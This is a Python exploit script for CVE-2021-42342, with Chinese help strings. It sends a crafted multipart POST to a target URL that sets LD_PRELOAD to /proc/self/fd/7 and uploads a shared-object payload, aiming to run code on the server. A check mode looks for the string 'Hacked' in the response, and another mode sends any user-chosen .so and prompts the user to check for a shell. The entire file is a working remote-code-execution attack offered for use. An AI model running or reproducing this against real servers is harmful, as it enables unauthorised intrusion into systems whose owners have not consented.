import os
import socket
import optparse
from urllib.parse import urlparse

fuck="a"*1000
upload='''POST {} HTTP/1.1
Host: {}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=------------------------16a4dcd72318d60f
Content-Length: #size#

--------------------------16a4dcd72318d60f
Content-Disposition: form-data; name="LD_PRELOAD"

/proc/self/fd/7
--------------------------16a4dcd72318d60f
Content-Disposition: form-data; name="data"; filename="1.txt"
Content-Type: text/plain

#payload#{}
--------------------------16a4dcd72318d60f--
'''
keyword=b"Hacked"
def exploit(url,poc,pocsize):
    url_=urlparse(url)
    host=url_.netloc
    if ":" in host:
        tmp=host.split(":")
        ip=tmp[0]
        port=int(tmp[1])
    else:
        ip=host
        if url_.scheme=="http":
            port=80
        elif url_.scheme=="https":
            port=443

    path=url.replace(str(url_.scheme+"://"+url_.netloc),"")
    uploaddata=upload.format(path,host,fuck).replace("\n","\r\n").replace("#size#",str(pocsize)).encode().replace(b"#payload#",poc)
    client=socket.socket()
    try:
        client.settimeout(5)
        client.connect((ip,port))
        client.sendall(uploaddata)
        response=client.recv(20480)
        if keyword in response:
            print("[+] CVE-2021-42342 ok")
        else:
            print("[-] Not Found CVE-2021-42342")
    except Exception as error:
        print("[-] Connection host:{} Failure,The Error:{}".format(host,error))

def main():
    parser=optparse.OptionParser()
    parser.add_option("-u",dest="url",help="检测的url")
    parser.add_option("-s",dest="so",help="指定so")
    parser.add_option("-c",dest="check",action="store_true",help="检测是否存在漏洞")
    option,args=parser.parse_args()
    if option.url and option.check:
        if os.path.exists("helloword.so"):
            demodata=open("helloword.so","rb").read()
            datalen=len(demodata)
            exploit(option.url,demodata,datalen)
        else:
            print("[-] Not Found helloword.so")
    elif option.url and option.so:
        if os.path.exists(option.so):
            data=open(option.so,"rb").read()
            sosize=len(data)
            exploit(option.url,data,sosize)
            print("[RaidEnMei] Send So Data,Check Shell ?")
        else:
            print("[-] Not Found {}".format(option.so))
    else:
        print("Example:\n"
              "python exploit.py -u <url> -c #检测漏洞\n"
              "python exploit.py -u <url> -s poc.so #指定so利用\n")
        parser.print_help()

if __name__ == '__main__':
    main()